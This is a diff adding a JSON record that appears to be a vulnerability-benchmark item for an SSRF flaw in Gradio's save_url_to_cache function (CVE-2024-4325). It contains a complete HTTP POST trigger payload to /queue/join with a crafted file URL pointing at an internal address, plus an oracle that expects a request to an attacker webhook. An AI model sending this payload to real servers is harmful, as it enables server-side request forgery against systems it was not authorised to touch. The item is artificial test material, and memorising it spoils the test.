@@ -1,0 +1,15 @@
+{
+  "file_id": "337_gradio_huntr_b34f084b-7d14-4f00-bc10-048a3a5aaf88",
+  "numeric_id": "337",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Server-Side Request Forgery (SSRF) in Gradio due to insufficient validation of user-provided URLs in save_url_to_cache function",
+  "cve": "CVE-2024-4325",
+  "cwe": "CWE-918: Server-Side Request Forgery (SSRF)",
+  "library": "gradio",
+  "affected_version": ">= 4.21.0, < 4.41.0",
+  "vulnerable_function": "save_url_to_cache",
+  "triggerability": "direct",
+  "trigger_payload": "POST /queue/join? HTTP/1.1\nHost: {BASE_URL}\nContent-Type: application/json\nContent-Length: 318\n{\n\"data\": [\n[\n{\n\"meta\": {\n\"_type\": \"gradio.FileData\"\n},\n\"path\": \"PAYLOAD\",\n\"url\": \"http://127.0.0.1:7860/file=/tmp/gradio/d1be868eeb62e5194df1\",\n\"orig_name\": \"favicon.ico\",\n\"size\": 15406,\n\"mime_type\": \"image/x-icon\"\n}\n]\n],\n\"event_data\": null,\n\"fn_index\": 0,\n\"trigger_id\": 2,\n\"session_hash\": \"l8v6ku4cm8d\"\n}",
+  "oracle": "An HTTP GET request is sent to the attacker-controlled webhook URL, proving SSRF was triggered."
+}
